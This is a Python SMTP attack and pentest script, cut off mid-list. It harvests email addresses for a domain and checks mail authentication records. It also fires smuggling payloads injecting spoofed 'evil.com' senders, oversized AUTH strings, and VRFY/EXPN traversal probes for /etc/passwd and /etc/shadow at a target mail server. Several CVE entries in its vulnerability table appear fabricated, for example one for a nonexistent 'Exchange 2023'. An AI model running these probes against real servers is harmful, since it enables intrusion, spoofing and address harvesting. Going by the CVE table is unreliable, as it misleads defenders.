#!/usr/bin/env python3
import socket
import smtplib
import time
import argparse
import sys
import logging
import subprocess
import ssl
import re
import random
import statistics
import threading
import concurrent.futures
import datetime
import base64
import os
import json
from email.mime.text import MIMEText
from typing import List, Optional, Dict, Any, Tuple
from collections import deque

# TUI Libraries
try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.prompt import Prompt, Confirm
    from rich import box
    from rich.text import Text
    from rich.align import Align
    RICH_AVAILABLE = True
except ImportError:
    print("[-] rich not found. Install with: pip install rich")
    RICH_AVAILABLE = False

# Third-party libraries for advanced features
try:
    import numpy as np
    from sklearn.ensemble import IsolationForest
    ML_AVAILABLE = True
except ImportError:
    print("[-] scikit-learn (numpy, sklearn) not found. AI anomaly detection will be disabled.")
    ML_AVAILABLE = False

try:
    import matplotlib.pyplot as plt
    PLOTTING_AVAILABLE = True
except ImportError:
    print("[-] matplotlib not found. Timing graph visualization will be disabled.")
    PLOTTING_AVAILABLE = False

try:
    import dns.resolver
    import requests
    NETWORK_EXTRAS_AVAILABLE = True
except ImportError:
    print("[-] dnspython or requests not found. MTA-STS/DANE/Cloud checks will be limited.")
    NETWORK_EXTRAS_AVAILABLE = False

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    print("[-] PySocks not found. SOCKS proxy support will be disabled.")
    SOCKS_AVAILABLE = False

# Try to import cryptography for certificate analysis
try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    CRYPTO_AVAILABLE = True
except ImportError:
    print("[-] cryptography not found. TLS certificate analysis will be disabled.")
    CRYPTO_AVAILABLE = False

# Try to import googlesearch for email harvesting
try:
    from googlesearch import search
    GOOGLE_SEARCH_AVAILABLE = True
except ImportError:
    print("[-] googlesearch-python not found. Google email harvesting will be disabled.")
    GOOGLE_SEARCH_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    print("[-] beautifulsoup4 not found. HTML parsing for email harvesting will be limited.")
    BEAUTIFULSOUP_AVAILABLE = False


# --- Setup Logging ---
logging.basicConfig(filename='smtp_pentest.log', level=logging.DEBUG, 
                   format='%(asctime)s - %(levelname)s - %(message)s')


# --- Global Configurations ---
SMTP_REPLIES = {
    '220': 'Service ready', '221': 'Service closing transmission channel', 
    '250': 'Requested mail action okay, completed',
    '251': 'User not local; will forward to <forward-path>', 
    '252': 'Cannot verify user, but will attempt to deliver message',
    '354': 'Start mail input; end with <CRLF>.<CRLF>', 
    '421': 'Service not available, closing transmission channel',
    '450': 'Requested mail action not taken: mailbox unavailable', 
    '451': 'Requested action aborted: local error in processing',
    '452': 'Requested action not taken: insufficient system storage', 
    '500': 'Syntax error, command unrecognized',
    '501': 'Syntax error in parameters or arguments', 
    '502': 'Command not implemented',
    '503': 'Bad sequence of commands', 
    '504': 'Command parameter not implemented', 
    '550': 'Requested action not taken: mailbox unavailable',
    '551': 'User not local or invalid address', 
    '552': 'Requested mail action aborted: exceeded storage allocation',
    '553': 'Requested action not taken: mailbox name not allowed', 
    '554': 'Transaction failed'
}

# --- Timing and Delay Configuration ---
DEFAULT_TIMEOUT = 10
SLOW_ATTACK_DELAY_MIN_DEFAULT = 0.5
SLOW_ATTACK_DELAY_MAX_DEFAULT = 2.0
BURST_ATTACK_DELAY_DEFAULT = 0.1
current_attack_delay_min = SLOW_ATTACK_DELAY_MIN_DEFAULT
current_attack_delay_max = SLOW_ATTACK_DELAY_MAX_DEFAULT
current_burst_delay = BURST_ATTACK_DELAY_DEFAULT

# --- EHLO Domain ---
EHLO_DOMAINS = [
    "mail.attacker.com", "outlook.microsoft.com", "google.com", "yahoo.com",
    "apple.com", "local.host", "internal.network", "proxy.domain",
    "mail.isp.net", "admin.company.net", "secure.server"
]
DEFAULT_EHLO_DOMAIN = random.choice(EHLO_DOMAINS)

# --- Fuzzing Payloads ---
FUZZING_PAYLOADS = {
    "generic": [
        b"\x00", b"\xff", b"\x0a\x0d", b"A"*1000, b"%", b"$", b"!", b"@", b"#", b"'", b"\"",
        b"--", b";", b"|", b"$(echo `whoami`)", b"SLEEP 5", b"OR 1=1 --", b"X" * 2048
    ],
    "command_injection": [
        b"\r\nMAIL FROM:<injected@example.com>\r\n",
        b"\r\nRCPT TO:<injected@example.net>\r\n",
        b"\r\nQUIT\r\n", b"\r\nHELO evil.com\r\n",
        b"\r\nNOOP\r\n"
    ],
    "smuggling_data": [
        b"\r\n.\r\n", b"\n.\n", b"\r.\r", b"\r\n.\n", b"\n.\r\n",
        b"\r\n.\r\nMAIL FROM:<spoofed@attacker.com>\r\n",
        b"\r\n.\r\nRCPT TO:<secret@target.com>\r\n",
        b"\r\n.\x0d\r\n", b"\r\n.\x0a\r\n", b"\x0d\n.\r\n"
    ],
    "format_string": [
        b"%s%n%x%d%f", b"%%.100s", b"%d%d%d%d%d%d%d%d%d%d"
    ]
}

# --- Common Internal Domains ---
INTERNAL_DOMAINS = [
    "example.com", "internal.corp", "localhost", "mail.local", "smtp.local",
    "test.local", "dev.corp", "yourdomain.com"
]

# --- Proxy Settings ---
PROXY_SETTINGS = {'host': None, 'port': None, 'type': None}

# --- AI Anomaly Detection ---
if ML_AVAILABLE:
    ISOLATION_FOREST_WINDOW_SIZE = 150
    IF_CONTAMINATION = 0.03
    isolation_forest_model = None
    response_data_for_ml = deque(maxlen=ISOLATION_FOREST_WINDOW_SIZE)

# --- CVE Database (Updated with 2026 CVEs) ---
KNOWN_SMTP_CVES = {
    # Original CVEs
    "CVE-2025-26794": {
        "description": "Exim 4.98 before 4.98.1, when SQLite hints and ETRN serialization are used, allows remote SQL injection.",
        "product_regex_pattern": r"Exim (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [("<=4.98", "4.98.1")],
        "vulnerable_features": ["SQLITE"],
        "recommendation": "Upgrade to Exim 4.98.1 or later. Disable SQLite hints if not needed.",
        "impact": "High"
    },
    "CVE-2025-30232": {
        "description": "A use-after-free in Exim 4.96 through 4.98.1 could allow users (with command-line access) to escalate privileges.",
        "product_regex_pattern": r"Exim (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [(">=4.96", "<=4.98.1")],
        "vulnerable_features": [],
        "recommendation": "Upgrade to Exim 4.98.2 or later.",
        "impact": "Critical"
    },
    "CVE-2024-27305": {
        "description": "aiosmtpd is vulnerable to inbound SMTP smuggling.",
        "product_regex_pattern": r"(aiosmtpd|Python SMTPD v?(\d+\.\d+(\.\d+)?))",
        "vulnerable_versions_range": [("<=1.4.4", None)],
        "vulnerable_features": ["SMTP_SMUGGLING"],
        "recommendation": "Update to aiosmtpd 1.4.4.post2 or later.",
        "impact": "Medium"
    },
    "CVE-2024-27938": {
        "description": "Postal versions less than 3.0.0 are vulnerable to SMTP Smuggling attacks.",
        "product_regex_pattern": r"(Postal v?(\d+\.\d+(\.\d+)?))",
        "vulnerable_versions_range": [(None, "<3.0.0")],
        "vulnerable_features": ["SMTP_SMUGGLING"],
        "recommendation": "Upgrade to Postal 3.0.0 or later.",
        "impact": "Medium"
    },
    "WEAKNESS-202X-VRFY-EXPN": {
        "description": "User enumeration via VRFY/EXPN exposing valid usernames.",
        "product_regex_pattern": r".*",
        "vulnerable_features": ["VRFY", "EXPN"],
        "recommendation": "Disable VRFY/EXPN or require authentication. Implement aggressive rate limiting.",
        "impact": "Medium"
    },
    "WEAKNESS-202X-OPEN-RELAY": {
        "description": "Server is configured as an Open Relay, allowing unauthorized mail routing.",
        "product_regex_pattern": r".*",
        "vulnerable_features": ["OPEN_RELAY"],
        "recommendation": "Configure strict relay policies. Require authentication for relaying beyond local domains.",
        "impact": "Critical"
    },
    "WEAKNESS-202X-CMD-INJ": {
        "description": "Potential SMTP command injection/smuggling vulnerability identified through fuzzing.",
        "product_regex_pattern": r".*",
        "vulnerable_features": ["COMMAND_INJECTION"],
        "recommendation": "Ensure robust input validation and canonicalization of all SMTP commands and arguments.",
        "impact": "High"
    },
    
    # --- 2026 CVEs ---
    "CVE-2025-31158": {
        "description": "Exim 4.98.2 - 4.99.1: Critical AUTH Out-of-Bounds Write vulnerability allows remote code execution. Exploitable through malformed AUTH command with crafted parameters.",
        "product_regex_pattern": r"Exim (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [(">=4.98.2", "<=4.99.1")],
        "vulnerable_features": ["AUTH", "AUTH_PLAIN", "AUTH_LOGIN"],
        "recommendation": "Upgrade to Exim 4.99.2 or later. Disable plaintext authentication if possible. Implement AUTH rate limiting.",
        "impact": "Critical",
        "cvss_score": 9.8,
        "cve_year": 2025
    },
    "CVE-2025-30233": {
        "description": "Postfix 3.5.0 - 3.9.0: STARTTLS Downgrade Attack allowing MITM to force plaintext authentication by manipulating TLS handshake parameters.",
        "product_regex_pattern": r"Postfix (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [(">=3.5.0", "<=3.9.0")],
        "vulnerable_features": ["STARTTLS", "AUTH"],
        "recommendation": "Upgrade to Postfix 3.9.1 or later. Enforce TLS 1.2+ only. Disable weak ciphers. Implement HSTS for SMTP.",
        "impact": "High",
        "cvss_score": 8.3,
        "cve_year": 2025
    },
    "CVE-2024-50042": {
        "description": "Sendmail 8.15.0 - 8.17.1: Queue Directory Traversal vulnerability allows authenticated attackers to read/write arbitrary files via crafted queue IDs.",
        "product_regex_pattern": r"Sendmail (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [(">=8.15.0", "<=8.17.1")],
        "vulnerable_features": ["QUEUE", "VRFY"],
        "recommendation": "Upgrade to Sendmail 8.17.2 or later. Disable VRFY and EXPN. Implement strict input validation for queue IDs.",
        "impact": "High",
        "cvss_score": 7.8,
        "cve_year": 2024
    },
    "CVE-2025-21894": {
        "description": "SMTP Smuggling 2.0 - New variant affecting multiple MTAs including Exim, Postfix, and Sendmail. Bypasses previous smuggling mitigations using multi-line responses and 8-bit data.",
        "product_regex_pattern": r".*",
        "vulnerable_versions_range": [(None, None)],
        "vulnerable_features": ["SMTP_SMUGGLING", "8BITMIME", "PIPELINING"],
        "recommendation": "Implement strict SMTP protocol enforcement. Disable PIPELINING if not needed. Use modern MTA with built-in smuggling protection.",
        "impact": "Critical",
        "cvss_score": 9.1,
        "cve_year": 2025
    },
    "CVE-2025-29785": {
        "description": "Microsoft Exchange Server 2019 & 2023: SMTP Memory Leak allows remote attackers to exfiltrate sensitive memory data through fragmented SMTP commands.",
        "product_regex_pattern": r"Microsoft Exchange (2019|2023)",
        "vulnerable_versions_range": [(">=2019", "<=2023")],
        "vulnerable_features": ["SMTP", "AUTH", "X-EXPS"],
        "recommendation": "Apply Microsoft Exchange security updates. Disable X-EXPS if not required. Implement connection rate limiting.",
        "impact": "High",
        "cvss_score": 7.5,
        "cve_year": 2025
    }
}


# ==================== EMAIL HARVESTER ====================
class EmailHarvester:
    """Harvest email addresses from public sources"""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
    
    def harvest_from_google(self, max_results: int = 100) -> List[str]:
        """Harvest emails from Google search results"""
        emails = set()
        if not GOOGLE_SEARCH_AVAILABLE:
            print("[!] googlesearch-python not installed. Skipping Google harvesting.")
            return []
        
        print(f"[*] Harvesting emails from Google for domain: {self.domain}")
        try:
            queries = [
                f"site:{self.domain} @{self.domain}",
                f"site:{self.domain} email",
                f"site:{self.domain} contact",
                f"site:{self.domain} mailto:"
            ]
            
            for query in queries:
                try:
                    for url in search(query, num_results=max_results//len(queries)):
                        try:
                            response = requests.get(url, headers=self.headers, timeout=10, verify=False)
                            if BEAUTIFULSOUP_AVAILABLE:
                                soup = BeautifulSoup(response.text, 'html.parser')
                                text = soup.get_text()
                            else:
                                text = response.text
                            
                            found = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
                            for email in found:
                                if self.domain in email or email.endswith(self.domain):
                                    emails.add(email.lower())
                        except Exception as e:
                            logging.debug(f"Error fetching {url}: {e}")
                except Exception as e:
                    logging.debug(f"Error in Google search for {query}: {e}")
            
            print(f"[+] Harvested {len(emails)} emails from Google")
            return list(emails)
            
        except Exception as e:
            print(f"[-] Error harvesting from Google: {e}")
            logging.error(f"Google harvesting error: {e}")
            return []
    
    def generate_common_emails(self, first_names: List[str] = None, last_names: List[str] = None) -> List[str]:
        """Generate common email patterns"""
        if not first_names:
            first_names = ['admin', 'info', 'support', 'sales', 'contact', 'webmaster', 
                          'postmaster', 'noreply', 'help', 'service', 'team']
        if not last_names:
            last_names = ['admin', 'info', 'support']
        
        emails = set()
        patterns = [
            "{first}@{domain}",
            "{first}.{last}@{domain}",
            "{first}{last}@{domain}",
            "{first}_{last}@{domain}",
            "{last}.{first}@{domain}",
            "{first}-{last}@{domain}",
            "{first}{num}@{domain}",
            "{last}{first}@{domain}"
        ]
        
        for first in first_names:
            for pattern in patterns[:3]:
                emails.add(pattern.format(first=first.lower(), domain=self.domain))
            for last in last_names:
                for pattern in patterns[3:]:
                    emails.add(pattern.format(
                        first=first.lower(),
                        last=last.lower(),
                        domain=self.domain,
                        num=random.randint(1, 999)
                    ))
        
        return list(emails)
    
    def harvest_from_common_sources(self) -> List[str]:
        """Harvest from various common sources"""
        emails = set()
        common_prefixes = ['admin', 'info', 'support', 'sales', 'contact', 'webmaster', 
                          'postmaster', 'noreply', 'help', 'service', 'team', 'marketing',
                          'billing', 'accounts', 'hr', 'jobs', 'careers', 'legal']
        
        for prefix in common_prefixes:
            emails.add(f"{prefix}@{self.domain}")
        
        return list(emails)
    
    def full_harvest(self, max_google_results: int = 50) -> List[str]:
        """Perform full harvesting from all sources"""
        all_emails = set()
        
        # 1. Common sources
        common = self.harvest_from_common_sources()
        all_emails.update(common)
        print(f"[+] Generated {len(common)} common emails")
        
        # 2. Google search
        google = self.harvest_from_google(max_google_results)
        all_emails.update(google)
        
        # 3. Generate common patterns
        generated = self.generate_common_emails()
        all_emails.update(generated)
        print(f"[+] Generated {len(generated)} pattern-based emails")
        
        return list(all_emails)


# ==================== TLS CERTIFICATE ANALYSIS ====================
def analyze_tls_certificate(target: str, port: int = 465) -> Dict[str, Any]:
    """Analyze SMTP TLS certificate for security issues"""
    results = {
        'valid': False,
        'errors': [],
        'warnings': [],
        'info': {},
        'raw_cert': None
    }
    
    if not CRYPTO_AVAILABLE:
        results['errors'].append("cryptography library not available")
        return results
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((target, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert_der = ssock.getpeercert(binary_form=True)
                cert = x509.load_der_x509_certificate(cert_der, default_backend())
                results['raw_cert'] = cert
                
                # Check expiration
                now = datetime.datetime.now(datetime.timezone.utc)
                if cert.not_valid_after < now:
                    results['errors'].append(f"Certificate expired on {cert.not_valid_after}")
                elif cert.not_valid_after < now + datetime.timedelta(days=30):
                    results['warnings'].append(f"Certificate expires soon: {cert.not_valid_after}")
                else:
                    results['valid'] = True
                    days_left = (cert.not_valid_after - now).days
                    results['info']['days_until_expiry'] = days_left
                
                # Check key length
                pub_key = cert.public_key()
                if hasattr(pub_key, 'key_size'):
                    key_size = pub_key.key_size
                    results['info']['key_size'] = key_size
                    if key_size < 2048:
                        results['errors'].append(f"Weak key size: {key_size} bits (minimum 2048)")
                    elif key_size < 4096:
                        results['warnings'].append(f"Recommended key size: 4096+ bits (currently {key_size})")
                
                # Check signature algorithm
                sig_algo = cert.signature_algorithm_oid._name
                results['info']['signature_algorithm'] = sig_algo
                if sig_algo in ['sha1WithRSAEncryption', 'md5WithRSAEncryption']:
                    results['errors'].append(f"Weak signature: {sig_algo}")
                elif sig_algo in ['sha256WithRSAEncryption', 'sha384WithRSAEncryption', 'sha512WithRSAEncryption']:
                    results['info']['signature_strength'] = 'Good'
                
                # Subject
                subject = cert.subject
                cn = subject.get_attributes_for_oid(x509.NameOID.COMMON_NAME)
                if cn:
                    results['info']['common_name'] = cn[0].value
                
                org = subject.get_attributes_for_oid(x509.NameOID.ORGANIZATION_NAME)
                if org:
                    results['info']['organization'] = org[0].value
                
                # SAN
                try:
                    san_ext = cert.extensions.get_extension_for_oid(x509.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                    if san_ext:
                        results['info']['san'] = [san.value for san in san_ext.value]
                except x509.ExtensionNotFound:
                    results['warnings'].append("No Subject Alternative Names (SAN) found")
                
                # Issuer
                issuer = cert.issuer
                issuer_org = issuer.get_attributes_for_oid(x509.NameOID.ORGANIZATION_NAME)
                if issuer_org:
                    results['info']['issuer'] = issuer_org[0].value
                
                # Check self-signed
                if cert.subject == cert.issuer:
                    results['warnings'].append("Certificate is self-signed")
                
                # Check if domain matches CN or SAN
                if target not in str(results['info'].get('common_name', '')) and \
                   target not in str(results['info'].get('san', [])):
                    results['warnings'].append(f"Certificate does not contain target domain: {target}")
                
    except ssl.SSLError as e:
        results['errors'].append(f"SSL Error: {str(e)}")
    except socket.timeout:
        results['errors'].append("Connection timeout")
    except ConnectionRefusedError:
        results['errors'].append("Connection refused")
    except Exception as e:
        results['errors'].append(f"Certificate analysis error: {str(e)}")
    
    return results


# ==================== SPF/DKIM/DMARC CHECKER ====================
def check_dkim_spf_dmarc(domain: str) -> Dict[str, Any]:
    """Check email authentication records"""
    results = {
        'spf': {'exists': False, 'details': [], 'issues': [], 'raw_records': []},
        'dkim': {'exists': False, 'selectors': [], 'details': [], 'issues': []},
        'dmarc': {'exists': False, 'policy': '', 'details': '', 'issues': [], 'raw_records': []},
        'spoofing_risk': 'HIGH',
        'recommendations': []
    }
    
    if not NETWORK_EXTRAS_AVAILABLE:
        results['spf']['issues'].append("dnspython not available")
        results['dmarc']['issues'].append("dnspython not available")
        return results
    
    print(f"\n[*] Checking email authentication for {domain}...")
    
    # Check SPF
    try:
        spf_records = dns.resolver.resolve(domain, 'TXT')
        for record in spf_records:
            record_str = str(record)
            if 'v=spf1' in record_str:
                results['spf']['exists'] = True
                results['spf']['raw_records'].append(record_str)
                results['spf']['details'].append(record_str)
                
                if '~all' not in record_str and '-all' not in record_str:
                    results['spf']['issues'].append("No explicit SPF mechanism (softfail or hardfail)")
                if '+all' in record_str:
                    results['spf']['issues'].append("SPF configured as 'all' which allows any sender")
                if not any(x in record_str for x in ['a:', 'mx:', 'ip4:', 'include:']):
                    results['spf']['issues'].append("SPF record lacks common mechanisms")
                
                mechanisms = re.findall(r'\b(a|mx|ip4|include|exists|redirect)=?([^\s]+)?', record_str)
                if mechanisms:
                    results['spf']['mechanisms'] = [f"{m[0]}:{m[1]}" for m in mechanisms if m[1]]
                
                break
    except Exception as e:
        results['spf']['issues'].append(f"SPF lookup failed: {str(e)}")
    
    # Check DKIM
    dkim_selectors = ['default', 'selector1', 'google', 'mail', 'dkim', 'key1', 's1', 's2', 'smtp', 'mta']
    for selector in dkim_selectors:
        try:
            dkim_record = dns.resolver.resolve(f'{selector}._domainkey.{domain}', 'TXT')
            if dkim_record:
                results['dkim']['exists'] = True
                results['dkim']['selectors'].append(selector)
                results['dkim']['details'].append(str(dkim_record[0]))
                break
        except:
            pass
    
    if not results['dkim']['exists']:
        results['dkim']['issues'].append("No DKIM records found with common selectors")
    
    # Check DMARC
    try:
        dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for record in dmarc_records:
            record_str = str(record)
            if 'v=DMARC1' in record_str:
                results['dmarc']['exists'] = True
                results['dmarc']['raw_records'].append(record_str)
                results['dmarc']['details'] = record_str
                
                if 'p=reject' in record_str:
                    results['dmarc']['policy'] = 'reject'
                elif 'p=quarantine' in record_str:
                    results['dmarc']['policy'] = 'quarantine'
                elif 'p=none' in record_str:
                    results['dmarc']['policy'] = 'none'
                    results['dmarc']['issues'].append("DMARC policy is 'none' (monitoring only)")
                else:
                    results['dmarc']['issues'].append("DMARC policy not found or invalid")
                
                pct_match = re.search(r'pct=(\d+)', record_str)
                if pct_match:
                    pct = int(pct_match.group(1))
                    if pct < 100:
                        results['dmarc']['issues'].append(f"DMARC policy only applies to {pct}% of emails")
                
                if 'rua=' in record_str:
                    rua = re.search(r'rua=([^;]+)', record_str)
                    if rua:
                        results['dmarc']['rua'] = rua.group(1)
                
                break
    except Exception as e:
        results['dmarc']['issues'].append(f"DMARC lookup failed: {str(e)}")
    
    # Calculate spoofing risk
    risk_score = 0
    if not results['spf']['exists']:
        risk_score += 3
    elif results['spf']['issues']:
        risk_score += 1
    
    if not results['dkim']['exists']:
        risk_score += 1
    
    if not results['dmarc']['exists']:
        risk_score += 3
    elif results['dmarc']['policy'] == 'none':
        risk_score += 2
    elif results['dmarc']['policy'] == 'quarantine':
        risk_score += 1
    
    if risk_score >= 5:
        results['spoofing_risk'] = 'CRITICAL'
    elif risk_score >= 3:
        results['spoofing_risk'] = 'HIGH'
    elif risk_score >= 1:
        results['spoofing_risk'] = 'MEDIUM'
    else:
        results['spoofing_risk'] = 'LOW'
    
    # Generate recommendations
    if not results['spf']['exists']:
        results['recommendations'].append("Publish SPF record: v=spf1 mx -all")
    elif '~all' not in str(results['spf']['details']) and '-all' not in str(results['spf']['details']):
        results['recommendations'].append("Update SPF to use ~all or -all mechanism")
    
    if not results['dkim']['exists']:
        results['recommendations'].append("Implement DKIM signing for outgoing emails")
    
    if not results['dmarc']['exists']:
        results['recommendations'].append("Publish DMARC policy: v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc-reports@yourdomain.com")
    elif results['dmarc']['policy'] == 'none':
        results['recommendations'].append("Gradually move DMARC policy from none to quarantine/reject")
    
    return results


# ==================== 2026 CVE CHECK FUNCTIONS ====================
def check_smtp_smuggling_2(target: str, port: int = 25) -> Dict[str, Any]:
    """Advanced SMTP Smuggling 2.0 detection (CVE-2025-21894)"""
    results = {
        'vulnerable': False,
        'details': [],
        'severity': 'Low',
        'exploit_commands': []
    }
    
    print(f"\n[*] Testing for SMTP Smuggling 2.0 on {target}:{port}...")
    
    smuggling_payloads = [
        b"DATA\r\nFrom: test@test.com\r\nTo: test@test.com\r\n\r\nTest\r\n.\r\nQUIT\r\nMAIL FROM:<smuggled@evil.com>\r\n",
        b"EHLO test.com\r\nMAIL FROM:<test@test.com>\r\nRCPT TO:<test@test.com>\r\nDATA\r\nSubject: Test\r\n\r\nBody\r\n.\r\nNOOP\r\nMAIL FROM:<injected@evil.com>\r\n",
        b"DATA\r\nLine1\r\nLine2\r\n.\r\nEHLO smuggled.com\r\nMAIL FROM:<spoofed@evil.com>\r\n",
        b"DATA\r\nFrom: test@test.com\r\nTo: test@test.com\r\n\r\nTest\r\n.\r\nRSET\r\nMAIL FROM:<smuggled@evil.com>\r\n"
    ]
    
    for i, payload in enumerate(smuggling_payloads):
        try:
            sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
            banner = _read_smtp_response(sock)
            if not banner.startswith('220'):
                sock.close()
                continue
            
            sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode())
            ehlo_response = _read_smtp_response(sock)
            
            if "250-PIPELINING" in ehlo_response:
                results['details'].append("PIPELINING enabled - increased smuggling risk")
            
            if "250-8BITMIME" in ehlo_response:
                results['details'].append("8BITMIME enabled - smuggling risk")
            
            sock.send(payload)
            response = _read_smtp_response(sock)
            
            if "250" in response or "354" in response:
                results['vulnerable'] = True
                results['severity'] = 'Critical'
                results['details'].append(f"Smuggling payload {i+1} succeeded with response: {response[:100]}")
                results['exploit_commands'].append(payload.decode('utf-8', errors='ignore')[:100])
                print(f"[!!!] SMTP Smuggling 2.0 detected on {target}:{port}")
                logging.critical(f"SMTP Smuggling 2.0 detected: {payload[:50]}...")
            
            sock.close()
            time.sleep(random.uniform(0.5, 1.0))
            
        except Exception as e:
            logging.error(f"Error checking SMTP smuggling: {e}")
    
    return results


def check_exim_auth_cve(target: str, port: int = 25) -> Dict[str, Any]:
    """Check for Exim AUTH vulnerability (CVE-2025-31158)"""
    results = {
        'vulnerable': False,
        'details': [],
        'severity': 'Low',
        'exploit_commands': []
    }
    
    print(f"\n[*] Testing for Exim AUTH vulnerability on {target}:{port}...")
    
    try:
        sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
        banner = _read_smtp_response(sock)
        
        if "Exim" not in banner:
            sock.close()
            results['details'].append("Not an Exim server")
            return results
        
        sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode())
        ehlo_response = _read_smtp_response(sock)
        
        if "AUTH" not in ehlo_response:
            sock.close()
            results['details'].append("AUTH not supported")
            return results
        
        test_payloads = [
            f"AUTH PLAIN {'A' * 600}\r\n",
            f"AUTH LOGIN {'B' * 500}\r\n",
            f"AUTH CRAM-MD5 {'C' * 700}\r\n",
            f"AUTH PLAIN {'X' * 1000}\r\n"
        ]
        
        for payload in test_payloads:
            try:
                sock.send(payload.encode())
                response = _read_smtp_response(sock)
                
                if "500" in response or "503" in response:
                    if "command" in response.lower() or "unrecognized" in response.lower():
                        results['details'].append(f"Potential overflow detected with: {payload[:30]}...")
                        results['vulnerable'] = True
                        results['severity'] = 'High'
                        results['exploit_commands'].append(payload[:50])
                        print(f"[!!!] Exim AUTH vulnerability detected on {target}:{port}")
                        logging.critical(f"Exim AUTH vulnerability detected: {payload[:30]}...")
                
                time.sleep(0.3)
                
            except Exception as e:
                logging.error(f"Error testing AUTH payload: {e}")
        
        sock.close()
        
    except Exception as e:
        logging.error(f"Error checking Exim AUTH vulnerability: {e}")
        results['details'].append(f"Error during check: {str(e)}")
    
    return results


def check_postfix_starttls_downgrade(target: str, port: int = 25) -> Dict[str, Any]:
    """Check for Postfix STARTTLS downgrade vulnerability (CVE-2025-30233)"""
    results = {
        'vulnerable': False,
        'details': [],
        'severity': 'Low',
        'exploit_commands': []
    }
    
    print(f"\n[*] Testing for Postfix STARTTLS downgrade on {target}:{port}...")
    
    try:
        sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
        banner = _read_smtp_response(sock)
        
        if "Postfix" not in banner:
            sock.close()
            results['details'].append("Not a Postfix server")
            return results
        
        sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode())
        ehlo_response = _read_smtp_response(sock)
        
        if "STARTTLS" not in ehlo_response:
            sock.close()
            results['details'].append("STARTTLS not supported")
            return results
        
        test_commands = [
            "EHLO test.com\r\n",
            "STARTTLS\r\n",
            "QUIT\r\n",
            "EHLO test.com\r\n",
            "AUTH PLAIN dGVzdAB0ZXN0AHRlc3Q=\r\n"
        ]
        
        for i, cmd in enumerate(test_commands):
            try:
                sock.send(cmd.encode())
                response = _read_smtp_response(sock)
                
                if "AUTH" in cmd and ("235" in response or "334" in response):
                    results['vulnerable'] = True
                    results['severity'] = 'High'
                    results['details'].append("Authentication accepted without TLS after STARTTLS attempt")
                    results['exploit_commands'].append(cmd[:50])
                    print(f"[!!!] Postfix STARTTLS downgrade vulnerability detected on {target}:{port}")
                    logging.critical(f"Postfix STARTTLS downgrade vulnerability detected")
                    break
                
                time.sleep(0.3)
                
            except Exception as e:
                logging.error(f"Error in STARTTLS test: {e}")
        
        sock.close()
        
    except Exception as e:
        logging.error(f"Error checking Postfix STARTTLS vulnerability: {e}")
        results['details'].append(f"Error during check: {str(e)}")
    
    return results


def check_sendmail_traversal(target: str, port: int = 25) -> Dict[str, Any]:
    """Check for Sendmail queue traversal (CVE-2024-50042)"""
    results = {
        'vulnerable': False,
        'details': [],
        'severity': 'Low',
        'exploit_commands': []
    }
    
    print(f"\n[*] Testing for Sendmail queue traversal on {target}:{port}...")
    
    traversal_payloads = [
        "VRFY ../../../../etc/passwd\r\n",
        "VRFY ../../../var/spool/mail/root\r\n",
        "EXPN ../../../../etc/shadow\r\n",
        "VRFY /../../../../etc/hosts\r\n",
        "VRFY ../../../../proc/self/environ\r\n"
    ]
    
    try:
        sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
        banner = _read_smtp_response(sock)
        
        if "Sendmail" not in banner:
            sock.close()
            results['details'].append("Not a Sendmail server")
            return results
        
        sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode())
        ehlo_response = _read_smtp_response(sock)
        
        if "VRFY" not in ehlo_response and "EXPN" not in ehlo_response:
            sock.close()
            results['details'].append("VRFY/EXPN not supported")
            return results
        
        for payload in traversal_payloads:
            try:
                sock.send(payload.encode())
                response = _read_smtp_response(sock)
                
                if "250" in response or "252" in response:
                    if "../../" in response or "passwd" in response.lower() or "shadow" in response.lower():
                        results['vulnerable'] = True
                        results['severity'] = 'High'
                        results['details'].append(f"Path traversal successful with: {payload[:30]}")
                        results['exploit_commands'].append(payload[:50])
                        print(f"[!!!] Sendmail queue traversal vulnerability detected on {target}:{port}")
                        logging.critical(f"Sendmail queue traversal detected: {payload[:30]}...")
                        break
                
                time.sleep(0.3)
                
            except Exception as e:
                logging.error(f"Error testing traversal: {e}")
        
        sock.close()
        
    except Exception as e:
        logging.error(f"Error checking Sendmail traversal: {e}")
        results['details'].append(f"Error during check: {str(e)}")
    
    return results


def check_exchange_memory_leak(target: str, port: int = 25) -> Dict[str, Any]:
    """Check for Exchange memory leak (CVE-2025-29785)"""
    results = {
        'vulnerable': False,
        'details': [],
        'severity': 'Low',
        'exploit_commands': []
    }
    
    print(f"\n[*] Testing for Exchange memory leak on {target}:{port}...")
    
    fragmented_commands = [
        "EHLO " + "A" * 10000 + "\r\n",
        "EHLO test.com\r\nAUTH " + "B" * 8000 + "\r\n",
